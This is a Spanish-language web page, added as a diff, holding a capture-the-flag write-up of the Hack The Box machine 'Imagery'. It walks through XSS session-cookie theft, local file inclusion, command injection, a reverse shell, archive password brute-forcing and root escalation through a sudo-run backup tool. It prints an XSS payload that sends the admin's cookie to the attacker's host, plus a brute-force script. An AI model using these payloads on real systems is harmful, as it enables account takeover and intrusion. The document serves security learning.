@@ -1,0 +1,1000 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Write-up - Imagery</title>
+    <link
+      rel="icon"
+      type="image/svg+xml"
+      href="../assets/icons/terminal_icon.svg"
+    />
+    <link rel="stylesheet" href="../css/styles.css" />
+    <link rel="stylesheet" href="../css/scrollbar.css" />
+    <link rel="stylesheet" href="../css/contact-modal.css" />
+    <link rel="stylesheet" href="../css/writeups.css" />
+  </head>
+  <body class="theme-locked">
+    <!-- Sidebar -->
+    <aside class="sidebar">
+      <div class="profile">
+        <div class="profile-img">
+          <img src="../assets/images/profile.png" alt="Alan Chalco - Ne0X-Z" />
+        </div>
+        <h1>Alan Chalco - Ne0X-Z</h1>
+        <p>Software Engineer & Cybersecurity Student</p>
+      </div>
+
+      <nav>
+        <ul class="nav-menu">
+          <li>
+            <a href="../index.html">
+              <span class="nav-icon">
+                <svg viewBox="0 0 24 24">
+                  <path
+                    d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"
+                  ></path>
+                  <polyline points="9 22 9 12 15 12 15 22"></polyline>
+                </svg>
+              </span>
+              Inicio
+            </a>
+          </li>
+          <li>
+            <a href="../about.html">
+              <span class="nav-icon">
+                <svg viewBox="0 0 24 24">
+                  <circle cx="12" cy="12" r="10"></circle>
+                  <line x1="12" y1="16" x2="12" y2="12"></line>
+                  <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                </svg>
+              </span>
+              Sobre Mí
+            </a>
+          </li>
+          <li>
+            <a href="../writeups/index.html" class="active">
+              <span class="nav-icon">
+                <svg viewBox="0 0 24 24">
+                  <rect
+                    x="3"
+                    y="11"
+                    width="18"
+                    height="11"
+                    rx="2"
+                    ry="2"
+                  ></rect>
+                  <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+              </span>
+              Write-ups
+            </a>
+          </li>
+          <li>
+            <a href="../blog/index.html">
+              <span class="nav-icon">
+                <svg viewBox="0 0 24 24">
+                  <path
+                    d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"
+                  ></path>
+                  <polyline points="14 2 14 8 20 8"></polyline>
+                  <line x1="16" y1="13" x2="8" y2="13"></line>
+                  <line x1="16" y1="17" x2="8" y2="17"></line>
+                  <polyline points="10 9 9 9 8 9"></polyline>
+                </svg>
+              </span>
+              Blog
+            </a>
+          </li>
+          <li>
+            <a href="#contact">
+              <span class="nav-icon">
+                <svg viewBox="0 0 24 24">
+                  <path
+                    d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"
+                  ></path>
+                  <polyline points="22,6 12,13 2,6"></polyline>
+                </svg>
+              </span>
+              Contacto
+            </a>
+          </li>
+        </ul>
+      </nav>
+
+      <div class="social-links">
+        <a href="https://github.com/Ne0X-Z" title="GitHub" class="icon">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <path
+              d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"
+            />
+          </svg>
+        </a>
+
+        <a
+          href="https://www.linkedin.com/in/ne0xx-18a9152a7"
+          title="LinkedIn"
+          class="icon"
+        >
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <path
+              d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"
+            />
+            <rect x="2" y="9" width="4" height="12" />
+            <circle cx="4" cy="4" r="2" />
+          </svg>
+        </a>
+
+        <a href="https://tryhackme.com/p/ne0X" title="TryHackMe" class="icon">
+          <img src="../assets/icons/tryhackme.svg" alt="TryHackMe" />
+        </a>
+
+        <a
+          href="https://app.hackthebox.com/profile/2067867"
+          title="Hack The Box"
+          class="icon"
+        >
+          <img src="../assets/icons/htb-icon.svg" alt="Hack The Box" />
+        </a>
+      </div>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="main-content">
+      <div class="writeup-container">
+        <!-- Back Button -->
+        <a href="index.html#writeups" class="back-button">
+          <svg viewBox="0 0 24 24">
+            <line x1="19" y1="12" x2="5" y2="12"></line>
+            <polyline points="12 19 5 12 12 5"></polyline>
+          </svg>
+          Volver a Write-ups
+        </a>
+
+        <!-- Header del Write-up -->
+        <div class="writeup-header">
+          <div class="writeup-title-container">
+            <div>
+              <h1 class="writeup-title">Imagery</h1>
+
+              <div class="writeup-meta">
+                <div class="meta-item">
+                  <svg viewBox="0 0 24 24">
+                    <rect
+                      x="3"
+                      y="4"
+                      width="18"
+                      height="18"
+                      rx="2"
+                      ry="2"
+                    ></rect>
+                    <line x1="16" y1="2" x2="16" y2="6"></line>
+                    <line x1="8" y1="2" x2="8" y2="6"></line>
+                    <line x1="3" y1="10" x2="21" y2="10"></line>
+                  </svg>
+                  <span>26 de Noviembre, 2025</span>
+                </div>
+
+                <div class="meta-item">
+                  <svg viewBox="0 0 24 24">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <polyline points="12 6 12 12 16 14"></polyline>
+                  </svg>
+                  <span>20 min lectura</span>
+                </div>
+
+                <div class="meta-item">
+                  <span class="difficulty medium">Medium</span>
+                </div>
+
+                <div class="meta-item">
+                  <img src="../assets/icons/htb-icon.svg" alt="Hack The Box" />
+                  <span>Hack The Box</span>
+                </div>
+              </div>
+
+              <div class="writeup-tags">
+                <span class="writeup-tag">Linux</span>
+                <span class="writeup-tag">LFI</span>
+                <span class="writeup-tag">XSS</span>
+                <span class="writeup-tag">Command Injection</span>
+                <span class="writeup-tag">Charcol</span>
+              </div>
+            </div>
+
+            <img
+              src="../assets/images/writeups/imagery/imagery.png"
+              alt="Conversor"
+              class="machine-logo"
+            />
+          </div>
+        </div>
+
+        <!-- Contenido del Write-up -->
+        <div class="writeup-content">
+          <!-- Info Box -->
+          <div class="info-box">
+            <div class="info-box-title">
+              <svg viewBox="0 0 24 24">
+                <circle cx="12" cy="12" r="10"></circle>
+                <line x1="12" y1="16" x2="12" y2="12"></line>
+                <line x1="12" y1="8" x2="12.01" y2="8"></line>
+              </svg>
+              Información de la Máquina
+            </div>
+            <p>
+              IP: 10.10.11.88 | OS: Linux | Dificultad: Medium | Plataforma: Hack The Box
+            </p>
+          </div>
+
+          <h2 id="reconocimiento">Reconocimiento</h2>
+          <p>
+            Comenzamos realizando un análisis de puertos TCP con <code>nmap</code> para identificar los servicios que el sistema objetivo tiene expuestos.
+          </p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/1.png" alt="Escaneo de puertos con nmap" />
+          </div>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/2.png" alt="Escaneo detallado de servicios" />
+          </div>
+
+          <p>Del escaneo detallado identificamos que el servidor web está siendo ejecutado mediante un servidor HTTP implementado en Python, lo cual es importante tener en cuenta para futuras etapas de la explotación.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/3.png" alt="Análisis con whatweb" />
+          </div>
+
+          <p>
+            Al realizar el análisis con WhatWeb podemos ver servicios y herramientas que usa el servidor.
+          </p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/4.png" alt="Página principal de la aplicación" />
+          </div>
+
+          <p>
+            Esta es la página principal del sistema.
+          </p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/5.png" alt="Scripts encontrados" />
+          </div>
+
+          <p>Revisando todo ese script, podemos encontrar algunas posibles rutas existentes en el sistema.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/6.png" alt="Rutas identificadas" />
+          </div>
+
+          <p>Y recordemos que también hay esta de upload</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/7.png" alt="Endpoint de upload" />
+          </div>
+
+
+          <div class="writeup-image" style="width: 50%; height: 50%;">
+            <img src="../assets/images/writeups/imagery/8.png" alt="Endpoint privilegiado" />
+          </div>
+
+          <p>
+            Existen endpoints privilegiados que necesitan de permisos administrativos como el usuario Admin
+          </p>
+
+          <p>Vamos a interceptar las peticiones de registro y la de loggeo</p>
+
+          <div class="writeup-image" style="width: 50%; height: 50%;">
+            <img src="../assets/images/writeups/imagery/9.png" alt="Petición interceptada" />
+          </div>
+
+          <p>Al interceptar las peticiones con Burp Suite, observamos que la aplicación utiliza JSON para el intercambio de datos entre el cliente y el servidor. Este detalle es significativo, ya que sugiere que podríamos estar ante una base de datos NoSQL (como MongoDB) en el backend, lo cual abre la posibilidad de realizar inyecciones NoSQL si los datos no están siendo validados correctamente.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/10.png" alt="Parámetro isAdmin encontrado" />
+          </div>
+
+          <p>Hay un parámetro isAdmin</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/11.png" alt="Prueba de isAdmin" />
+          </div>
+
+          <p>Intentamos ejecutar un Mass Assigment modificando el parámetro <code>isAdmin</code> a <code>true</code> durante el registro para obtener privilegios administrativos de forma directa, sin embargo, esta técnica no funcionó.</p>
+
+          <div class="info-box warning">
+            <div class="info-box-title">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"
+                ></path>
+                <line x1="12" y1="9" x2="12" y2="13"></line>
+                <line x1="12" y1="17" x2="12.01" y2="17"></line>
+              </svg>
+              Nota Técnica
+            </div>
+            <p>
+              El <strong>Mass Assignment</strong> es una vulnerabilidad en la que la aplicación asigna
+              automáticamente datos enviados por el usuario a propiedades internas sin comprobar
+              qué campos pueden modificarse, lo que permite alterar valores sensibles.
+            </p>
+          </div>
+
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/12.png" alt="Resultado de la prueba" />
+          </div>
+
+          <p>La modificación del parámetro no funcionó.</p>
+            
+          <p>Vamos a explorar otros vectores de ataque, como las inyecciones NoSQL durante el proceso de autenticación, que podrían permitirnos bypassear la validación de credenciales.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/13.png" alt="Intento de inyección NoSQL" />
+          </div>
+
+          <p>Realizamos varios intentos de inyección NoSQL utilizando payloads comunes como <code>{"$ne": null}</code> y operadores MongoDB, sin embargo, la aplicación parece tener algún tipo de sanitización implementada.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/14.png" alt="Confirmación de sanitización" />
+          </div>
+
+          <p>Confirmamos que existe una validación en el backend que está bloqueando nuestros intentos de inyección NoSQL. Esto nos obliga a buscar otros vectores de ataque en la aplicación.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/15.png" alt="Requisitos de testUser" />
+          </div>
+
+          <p>Durante la enumeración de la aplicación, descubrimos que ciertas funcionalidades críticas como la edición y conversión de imágenes están restringidas únicamente al usuario <code>testUser</code>. Esto implica que necesitamos encontrar una forma de modificar nuestros atributos de usuario o comprometer las credenciales de <code>testUser</code> para acceder a estas funcionalidades privilegiadas.</p>
+
+          <h2 id="file-upload">Análisis de Subida de Archivos</h2>
+
+          <p>Identificamos un endpoint de subida de archivos que merece un análisis más profundo.</p>
+          
+          <p>Vamos a investigar qué tipo de validaciones implementa la aplicación.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/16.png" alt="Prueba de subida de archivos" />
+          </div>
+
+          <p>Notamos que la aplicación no está validando correctamente los tipos MIME de los archivos subidos, lo que podría permitirnos subir archivos maliciosos.</p>
+
+          <p>Realizamos una prueba subiendo un archivo con extensión <code>.php</code></p> 
+          
+          <p>También ponemos como nombre un payload SSTI (Server-Side Template Injection) para evaluar si podemos hacer que el renderizador de plantillas interprete nuestras inyecciones.</p>
+
+          <div class="writeup-image" style="width: 50%; height: 50%;">
+            <img src="../assets/images/writeups/imagery/17.png" alt="Resultado de subida PHP" />
+          </div>
+
+          <p>La aplicación rechaza el archivo, lo que indica que sí existe una validación basada en la extensión del archivo. Esto descarta la posibilidad de subir directamente archivos PHP o con extensiones peligrosas que nos interesarían, como un archivo .py.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/18.png" alt="Prueba de SSTI" />
+          </div>
+
+          <p>Confirmamos que la aplicación no es vulnerable a SSTI en este endpoint.</p>
+
+          <p>Sin embargo, descubrimos un endpoint interesante: <code>/report_bug</code>. Este endpoint permite a los usuarios enviar reportes de bugs que posteriormente son revisados por un usuario con privilegios de administrador.</p>
+          
+          
+          <p>Esta funcionalidad es particularmente interesante, ya que implica que un usuario privilegiado interactuará con el contenido que enviemos.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/19.png" alt="Endpoint report_bug" />
+          </div>
+
+          <p>El endpoint <code>/report_bug</code> representa una oportunidad perfecta para explotar una vulnerabilidad XSS (Cross-Site Scripting). Si logramos inyectar código JavaScript malicioso en nuestro reporte, este será ejecutado en el navegador del administrador cuando revise el bug. Esto nos permitiría robar su cookie de sesión y obtener acceso privilegiado.</p>
+
+          <h2 id="xss-exploitation">Explotación XSS</h2>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/20.png" alt="Enviando payload XSS" />
+          </div>
+
+          <p>Procedemos a enviar un payload XSS básico a través del formulario de reporte de bugs para verificar si la aplicación es vulnerable.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/21.png" alt="XSS confirmado" />
+          </div>
+
+          <p>¡Excelente! Confirmamos que la aplicación es vulnerable a XSS. El código JavaScript que enviamos se ejecutó correctamente. Ahora podemos aprovechar esta vulnerabilidad para robar la cookie de sesión del   usuario administrador cuando revise nuestro reporte.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/22.png" alt="Primer intento de robo de cookie" />
+          </div>
+
+          <p>Inicialmente intentamos usar <code>fetch()</code> para exfiltrar la cookie, pero sospechamos que puede estar siendo filtrado por algún mecanismo de seguridad o simplemente el payload no funcionó como debía.</p>
+          
+          <p>Decidimos cambiar nuestro enfoque y utilizar un método alternativo más efectivo para evaluar que el XSS sí exista.</p>
+
+          <div class="code-block">
+            <div class="code-header">
+              <div class="terminal-buttons">
+                <span class="btn-red"></span>
+                <span class="btn-yellow"></span>
+                <span class="btn-green"></span>
+              </div>
+              <span class="terminal-title">javascript</span>
+            </div>
+            <div class="code-content no-scrollbar">
+              <pre>&lt;img src=x onerror=document.location='http://10.10.14.248/hola.php?c='+document.cookie&gt;</pre>
+            </div>
+          </div>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/23.png" alt="XSS Payload" />
+          </div>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/24.png" alt="XSS Payload" />
+          </div>
+
+          <p>Utilizamos un payload que abusa del evento <code>onerror</code> de una etiqueta <code>&lt;img&gt;</code> para redirigir al administrador a nuestro servidor, enviando su cookie como parámetro en la URL.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/25.png" alt="Acceso como admin" />
+          </div>
+          <p>Logramos capturar la cookie de sesión del usuario administrador.</p>
+
+          <p>Con la cookie de sesión en nuestro poder, podemos impersonar al administrador. Ahora tenemos acceso a endpoints y funcionalidades privilegiadas que antes no estaban disponibles para nuestro usuario regular.</p>
+
+          <div class="writeup-image" style="width: 50%; height: 50%;">
+            <img src="../assets/images/writeups/imagery/26.png" alt="Admin privilegiado" />
+          </div>
+
+          <p>Confirmamos que hemos obtenido acceso administrativo exitosamente. Ahora podemos explorar las funcionalidades privilegiadas de la aplicación.</p>
+
+          <h2 id="lfi-exploitation">Explotación LFI</h2>
+
+          <p>Como administrador, ahora tenemos acceso a un endpoint que nos permite visualizar logs del sistema. Esta funcionalidad parece aceptar un parámetro para especificar qué archivo de log queremos leer.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/71.png" />
+          </div>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/27.png" alt="Prueba de LFI" />
+          </div>
+
+          <p>Decidimos probar si el endpoint es vulnerable a Local File Inclusion (LFI) intentando leer archivos arbitrarios del sistema, como <code>/etc/passwd</code>.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/28.png" alt="LFI confirmado" />
+          </div>
+
+          <p>La aplicación es vulnerable a LFI. Podemos leer archivos arbitrarios del sistema, lo que nos da acceso a información sensible como configuraciones, código fuente de la aplicación, y potencialmente credenciales.</p>
+
+          <p>Aprovechando la vulnerabilidad LFI, procedemos a extraer el código fuente completo de la aplicación web para identificar vulnerabilidades adicionales y entender mejor su funcionamiento interno.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/30.png" alt="Ruta de la aplicación" />
+          </div>
+
+          <p>Tenemos el archivo principal mediante el cuál corre el servidor.</p>
+
+          <h2 id="code-analysis">Análisis de Código Fuente</h2>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/31.png" alt="Configuración de la app" />
+          </div>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/32.png" alt="Uso de exiftool" />
+          </div>
+
+          <p>Están usando exiftool</p>
+
+          <div class="writeup-image" style="width: 50%; height: 50%;">
+            <img src="../assets/images/writeups/imagery/33.png" alt="Nombre de base de datos" />
+          </div>
+
+          <p>Parece que están usando un .json como base de datos</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/34.png" alt="Hashes encontrados" />
+          </div>
+
+          <p>Podemos tratar de crackear esos hashes</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/35.png" alt="Hash crackeado" />
+          </div>
+
+          <p>Tenemos la contraseña de testuser.</p>
+
+          <p>Ok, siguiendo lo que nos decía el archivo config.py, podemos intuir que los archivos están así</p>
+
+          <div class="writeup-image" style="width: 25%; height: 25%;">
+            <img src="../assets/images/writeups/imagery/37.png"
+                alt="Estructura de archivos"
+            />
+          </div>
+
+          <p>Podemos intentar descargar todos los archivos usando un one-liner con curl.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/38.png" alt="Archivos descargados" />
+          </div>
+
+          <p>Ya tenemos los archivos del aplicativo web.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/39.png" alt="Script api_edit.py" />
+          </div>
+
+          <p>Este es el contenido del script api_edit.py.</p>
+
+          <h2 id="command-injection">Command Injection</h2>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/40.png" alt="Punto de inyección" />
+          </div>
+
+          <p>Aquí vemos un posible command injection en el endpoint /apply_visual_transform.</p>
+          <p>Vamos a comprobar si realmente es explotable.</p>
+          <p>Para eso, primero necesitamos loguearnos como testUser, que es quien tiene los permisos necesarios.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/41.png" alt="Cookie de testUser" />
+          </div>
+
+          <p>Ya tenemos su cookie de sesión.</p>
+          <p>Ahora debemos revisar si el usuario tiene alguna imagen subida.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/42.png" alt="Imágenes del usuario" />
+          </div>
+
+          <p>Sí tiene imágenes disponibles.</p>
+          <p>Usaremos el ID de una de ellas.</p>
+          <p>Con los parámetros necesarios, el payload queda así.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/43.png" alt="Payload de command injection" />
+          </div>
+
+          <p>Y confirmamos que el command injection funciona.</p>
+
+          <h2 id="reverse-shell">Reverse Shell</h2>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/44.png" alt="Shell obtenida" />
+          </div>
+
+          <p>Ya estamos dentro de la máquina víctima.</p>
+
+          <div class="info-box success">
+            <div class="info-box-title">
+              <svg viewBox="0 0 24 24">
+                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                <polyline points="22 4 12 14.01 9 11.01"></polyline>
+              </svg>
+              Acceso Inicial Obtenido
+            </div>
+            <p>Obtenemos acceso al sistema explotando el command injection.</p>
+          </div>
+
+          <div class="writeup-image" style="width: 50%; height: 50%;">
+            <img src="../assets/images/writeups/imagery/45.png" alt="Contraseña del admin del sistema" />
+          </div>
+
+          <p>Esta es la contraseña del usuario admin del sistema.</p>
+
+          <h2 id="privilege-escalation">Escalada de Privilegios</h2>
+
+          <p>Empezamos revisando servicios, tareas y archivos del sistema.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/46.png" alt="Archivos zip encontrados" />
+          </div>
+
+          <p>Durante la enumeración encontramos varios archivos .zip encriptados.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/47.png" alt="Análisis del zip" />
+          </div>
+
+          <p>Vamos a analizarlos más a fondo.</p>
+
+          <div class="writeup-image" style="width: 50%; height: 50%;"> 
+            <img src="../assets/images/writeups/imagery/48.png" alt="Zip con PyAesCrypt" />
+          </div>
+
+          <p>El comprimido está encriptado con PyAesCrypt.</p>
+
+          <div class="code-block">
+            <div class="code-header">
+              <div class="terminal-buttons">
+                <span class="btn-red"></span>
+                <span class="btn-yellow"></span>
+                <span class="btn-green"></span>
+              </div>
+              <span class="terminal-title">python</span>
+            </div>
+            <div class="code-content no-scrollbar">
+              <pre>import pyAesCrypt, os
+
+          def probar(passwords, file_enc, buffer_size=64*1024):
+              for pwd in passwords:
+                  try:
+                      os.system("clear")
+                      print(f"Probando con la contraseña -> {pwd}")
+                      out = "backup.zip"
+                      pyAesCrypt.decryptFile(file_enc, out, pwd.strip(), buffer_size)
+                      print(f"[+] ¡Contraseña encontrada!: {pwd.strip()}")
+                      return
+                  except ValueError:
+                      continue
+              print("[-] Ninguna funcionó.")
+
+          with open("/usr/share/wordlists/rockyou.txt") as f:
+              probar(f, "backup.zip.aes")</pre>
+            </div>
+          </div>
+
+          <p>Vamos a probar un ataque de fuerza bruta usando este script.</p>
+
+          <div class="writeup-image" style="width: 50%; height: 50%;">
+            <img src="../assets/images/writeups/imagery/50.png" alt="Contraseña encontrada" />
+          </div>
+
+          <p>Logramos obtener la contraseña del archivo.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/51.png" alt="Contenido del backup" />
+          </div>
+
+          <p>Se trata de un backup antiguo de la aplicación.</p>
+          <p>Revisamos si contiene algo útil.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/52.png" alt="Usuario mark en la BD" />
+          </div>
+
+          <p>Dentro de la base de datos encontramos un usuario llamado mark.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/53.png" alt="Contraseña de mark" />
+          </div>
+
+          <p>Tenemos su contraseña.</p>
+
+          <div class="writeup-image" style="width: 50%; height: 50%;">
+            <img src="../assets/images/writeups/imagery/54.png" alt="Acceso como mark" />
+          </div>
+
+          <p>Accedemos como el usuario Mark.</p>
+
+          <div class="info-box success">
+            <div class="info-box-title">
+              <svg viewBox="0 0 24 24">
+                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                <polyline points="22 4 12 14.01 9 11.01"></polyline>
+              </svg>
+              User Flag Obtenida
+            </div>
+            <p>Ya tenemos acceso como el usuario Mark.</p>
+          </div>
+
+          <h2 id="charcol-exploitation">Explotación de Charcol</h2>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/55.png" alt="Permisos sudo de mark" />
+          </div>
+
+          <p>Vemos que Mark puede ejecutar el binario “charcol” como root.</p>
+          <p>Charcol es una herramienta para hacer backups, y usarla como root nos permite intentar conseguir sus credenciales.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/56.png" alt="Reset de contraseña" />
+          </div>
+
+          <p>Nos pide una contraseña, pero podemos resetearla.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/57.png" alt="Funcionalidades de charcol" />
+          </div>
+
+          <p>Revisamos qué funcionalidades ofrece el programa.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/58.png" alt="Intentando backup de root" />
+          </div>
+
+          <p>Intentamos sacar un backup del directorio /root/.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/59.png" alt="Backup en proceso" />
+          </div>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/60.png" alt="Backup bloqueado" />
+          </div>
+
+          <p>El programa indica que ese directorio está bloqueado.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/61.png" alt="Creación de cron jobs" />
+          </div>
+
+          <p>Parece que podemos crear tareas cron desde la herramienta.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/62.png" alt="Traza ICMP recibida" />
+          </div>
+
+          <p>Recibimos una traza ICMP, lo cual confirma que se ejecutó.</p>
+
+          <div class="info-box warning">
+            <div class="info-box-title">
+              <svg viewBox="0 0 24 24">
+                <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+                <line x1="12" y1="9" x2="12" y2="13"></line>
+                <line x1="12" y1="17" x2="12.01" y2="17"></line>
+              </svg>
+              Aviso Legal
+            </div>
+            <p>
+              Recordemos que estamos ejecutando charcol como root, por lo que esta tarea cron se ejecuta como el usuario root.
+            </p>
+          </div>
+
+          <p>Ahora podemos crear una tarea cron que nos dé una reverse shell como root.</p>
+
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/63.png" alt="Root shell obtenida" />
+          </div>
+
+          <p>Ya tenemos acceso como root.</p>
+
+          <div class="info-box success">
+            <div class="info-box-title">
+              <svg viewBox="0 0 24 24">
+                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                <polyline points="22 4 12 14.01 9 11.01"></polyline>
+              </svg>
+              Root Flag Obtenida
+            </div>
+            <p>Obtenemos acceso root explotando Charcol.</p>
+          </div>
+
+          <h2 id="alternative-privesc">Método Alternativo de Escalada</h2>
+
+          <p>Hay otra forma de escalar privilegios.</p>
+          <p>Podemos usar la opción fetch para descargar archivos desde una URL.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/64.png" alt="Función fetch de charcol" />
+          </div>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/65.png" alt="Archivo creado como root" />
+          </div>
+
+          <p>El archivo descargado se crea con permisos de root.</p>
+          <p>Esto nos permite, por ejemplo, generar un authorized_keys dentro del directorio de root.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/66.png" alt="Método con authorized_keys" />
+          </div>
+
+          <p>Otra opción es crear un /etc/passwd modificado y sobrescribir el original.</p>
+
+          <div class="writeup-image" style="width: 50%; height: 50%;">
+            <img src="../assets/images/writeups/imagery/67.png" alt="Modificando /etc/passwd" />
+          </div>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/68.png" alt="Fetch del passwd modificado" />
+          </div>
+
+          <p>Hacemos fetch del archivo modificado para reemplazar /etc/passwd.</p>
+
+          <div class="writeup-image">
+            <img src="../assets/images/writeups/imagery/69.png" alt="Contraseña configurada" />
+          </div>
+
+          <p>La contraseña que configuramos para root es “hola”.</p>
+
+          <div class="writeup-image" style="width: 50%; height: 50%;">
+            <img src="../assets/images/writeups/imagery/70.png" alt="Acceso root alternativo" />
+          </div>
+
+          <p>También conseguimos acceso root usando este método alternativo.</p>
+
+
+
+          <h2 id="conclusion">Conclusión</h2>
+
+          <p>La cadena de explotación completa fue la siguiente:</p>
+
+          <div class="info-box">
+            <div class="info-box-title">
+              <svg viewBox="0 0 24 24">
+                <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline>
+              </svg>
+              Cadena de Ataque
+            </div>
+            <ul>
+              <li><strong>Reconocimiento:</strong> Identificación de servicios HTTP (80) y SSH (22)</li>
+              <li><strong>XSS:</strong> Explotación de XSS para robar cookie de administrador</li>
+              <li><strong>LFI:</strong> Local File Inclusion para leer archivos del sistema</li>
+              <li><strong>Command Injection:</strong> Inyección de comandos en endpoint /apply_visual_transform</li>
+              <li><strong>Credential Reuse:</strong> Crackeo de hashes y reutilización de credenciales</li>
+              <li><strong>Escalada (Método 1):</strong> Explotación de charcol con tareas cron como root</li>
+              <li><strong>Escalada (Método 2):</strong> Modificación de /etc/passwd mediante fetch de charcol</li>
+            </ul>
+          </div>
+
+          <div class="info-box warning">
+            <div class="info-box-title">
+              <svg viewBox="0 0 24 24">
+                <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+                <line x1="12" y1="9" x2="12" y2="13"></line>
+                <line x1="12" y1="17" x2="12.01" y2="17"></line>
+              </svg>
+              Aviso Legal
+            </div>
+            <p>
+              Este write-up tiene fines puramente educativos. Las técnicas descritas solo deben ser utilizadas en entornos controlados y con autorización explícita.
+            </p>
+          </div>
+        </div>
+
+
+        
+      </div>
+    </main>
+
+    <!-- Contact Modal -->
+    <div id="contactModal" class="modal">
+      <div class="modal-overlay"></div>
+      <div class="modal-content">
+        <button class="modal-close" id="closeModal">
